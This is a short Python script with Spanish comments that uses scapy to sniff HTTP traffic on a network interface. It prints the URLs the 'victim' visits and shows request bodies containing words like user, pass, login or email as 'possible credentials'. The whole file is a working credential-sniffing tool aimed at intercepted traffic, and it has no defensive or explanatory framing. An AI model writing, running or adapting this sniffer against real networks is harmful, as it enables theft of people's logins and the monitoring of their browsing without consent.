#!/usr/bin/env python3


import signal
import sys
import urllib.parse

import scapy.all as scapy

# NOTE: necesita importar el layer http en scapy
from scapy.layers import http
from termcolor import colored


def def_handler(sig, frame):
    print(colored("[!] Saliendo...\n\n", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def process_packet(packet):

    cred_keywords = ["user", "pass", "login", "mail", "email", "name"]

    if packet.haslayer(http.HTTPRequest):
        url = (
            "http://"
            + packet[http.HTTPRequest].Host.decode()
            + packet[http.HTTPRequest].Path.decode()
        )
        print(colored(f"[+] URL visitada por la victima: {url}", "blue"))
        if packet.haslayer(scapy.Raw):
            try:
                # NOTE: load esta dentro de Raw, visto en packet.show()
                response = packet[scapy.Raw].load.decode()
                # NOTE: URL decode a la respuesta
                response_decoded = urllib.parse.unquote(response)

                for keyword in cred_keywords:
                    if keyword in response:

                        print(
                            colored(
                                f"\n[+] Posibles credenciales: {response_decoded}",
                                "green",
                            ),
                        )
                        break
            except:
                pass


def sniff(interface):
    scapy.sniff(iface=interface, prn=process_packet, store=0)


def main():

    print(colored("[+] Escuchando por interface"))
    sniff("ens33")


if __name__ == "__main__":
    main()
